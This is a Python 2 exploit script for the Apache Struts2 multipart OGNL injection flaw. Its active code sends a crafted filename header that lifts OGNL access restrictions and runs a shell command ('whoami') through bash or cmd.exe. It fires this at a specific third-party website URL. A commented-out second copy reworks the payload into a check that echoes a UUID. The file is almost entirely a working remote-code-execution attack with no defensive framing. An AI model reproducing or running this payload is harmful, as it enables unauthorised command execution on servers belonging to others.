#! /usr/bin/env python
# encoding:utf-8
import pycurl
import StringIO
import urllib,uuid
def exploit(url):
    id = str(uuid.uuid1())
    cmd = "whoami"
    data="-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"
    sio = StringIO.StringIO()
    c = pycurl.Curl()
    c.setopt(pycurl.URL, url)
    c.setopt(pycurl.REFERER, url)
    c.setopt(pycurl.HTTPHEADER, ['Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150', 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36'])
    c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_0)
    c.setopt(pycurl.POST, 1)
    c.setopt(pycurl.POSTFIELDS, data)
    c.setopt(pycurl.CONNECTTIMEOUT, 300)
    c.setopt(pycurl.TIMEOUT, 300)
    c.setopt(pycurl.WRITEFUNCTION, sio.write)
    try:
        c.perform()
    except Exception, ex:
        pass
    c.close()
    resp = sio.getvalue()
    sio.close()
    print resp
exploit('http://www.yiguinfo.com/heistudy/web/loadQContent_exclue.action?currentId=150619125343865000000000000084413e381155eb1f45aaa02fe8caea12c890')

"""
#! /usr/bin/env python
# encoding:utf-8
import pycurl
import StringIO
import urllib,uuid
def exploit(url):
    id = str(uuid.uuid1())
    cmd = "echo " + id
    data="-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"
    sio = StringIO.StringIO()
    c = pycurl.Curl()
    c.setopt(pycurl.URL, url)
    c.setopt(pycurl.REFERER, url)
    c.setopt(pycurl.HTTPHEADER, ['Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150', 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36'])
    c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_0)
    c.setopt(pycurl.POST, 1)
    c.setopt(pycurl.POSTFIELDS, data)
    c.setopt(pycurl.CONNECTTIMEOUT, 300)
    c.setopt(pycurl.TIMEOUT, 300)
    c.setopt(pycurl.WRITEFUNCTION, sio.write)
    try:
        c.perform()
    except Exception, ex:
        pass
    c.close()
    resp = sio.getvalue()
    sio.close()
    print resp
    if id in resp:
        return True,id
    else:
        return False,None
status,keyword = exploit(target)
"""